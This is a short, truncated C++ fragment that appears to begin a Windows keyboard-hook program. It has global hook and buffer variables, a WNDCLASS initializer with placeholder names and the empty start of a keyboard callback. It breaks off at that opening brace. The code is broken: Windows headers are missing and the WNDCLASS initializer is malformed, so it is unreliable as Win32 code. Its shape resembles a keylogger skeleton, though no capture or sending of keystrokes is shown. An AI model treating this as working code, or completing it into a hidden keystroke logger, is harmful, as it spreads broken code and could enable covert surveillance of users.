#include <iostream>

using namespace std;

#define MAX_BUFFER_SIZE 1024

static int g_hook = 0;
static HWND hwnd = NULL;
static char buffer[MAX_BUFFER_SIZE] = {0};

// Window class details
WNDCLASS wc = {
    sizeof(WNDCLASS),
    WND_CLASS_NAME,
    WND_PROC,
    0,
    0,
    0,
    0,
    0,
    0,
};

// Callback function for keyboard events
void CALLBACK keyboardCallback(int nCode, WPARAM wParam, LPARAM lParam) {
